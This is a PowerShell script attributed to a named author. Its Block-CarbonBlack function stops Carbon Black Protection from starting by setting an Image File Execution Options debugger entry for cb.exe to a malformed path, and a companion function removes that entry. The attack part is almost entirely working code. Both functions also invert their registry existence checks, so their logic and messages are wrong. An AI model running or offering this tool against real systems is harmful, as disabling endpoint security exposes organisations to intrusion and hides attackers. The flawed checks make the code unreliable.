function Block-CarbonBlack{
<#
.SYNOPSIS
Powershell script that will block the execution of Carbon Black Protection <= 7.2.3 Patch 2
Author: Jonathan Echavarria (@Und3rf10w)

.DESCRIPTION
This function will check for the existence of a registry key for cb.exe in Image File Execution Options. If it does not
exist, it will create it. Finally, once the path is verified to exist, add a new property value for Debugger and point
it to a malformed path. Next time cb.exe attempts to start, the malformed entry will prevent it from starting.

.EXAMPLE
PS C:\> Block-CarbonBlack
#>
    if(!(Test-Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cb.exe")){
    write-host "Cb.exe key already exists, showing contents: "
    Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cb.exe"
    } else {
        write-host "Cb.exe key doesn't exist, creating it"
        New-Item -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cb.exe" -Force
    }
    
    $file_path = [System.IO.Path]::GetRandomFileName()
    $malformed_path = "`"C:\Windows\" + $file_path + "`""
    write-host "Creating randomized debugger key with malformed path of " + $malformed_path
    New-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cb.exe" -Name "Debugger" -Value $malformed_path
}

function Restore-CarbonBlack{
<#
.DESCRIPTION
This function will remove the Image File Execution Options key for cb.exe if it exists

.EXAMPLE
PS C:\> Restore-CarbonBlack
#>
    if(!(Test-Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cb.exe")){
        Remove-Item -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cb.exe"
        Write-Host "Removed the cb.exe key"
    } else{
        Write-Host "cb.exe key does not exist"
    }
}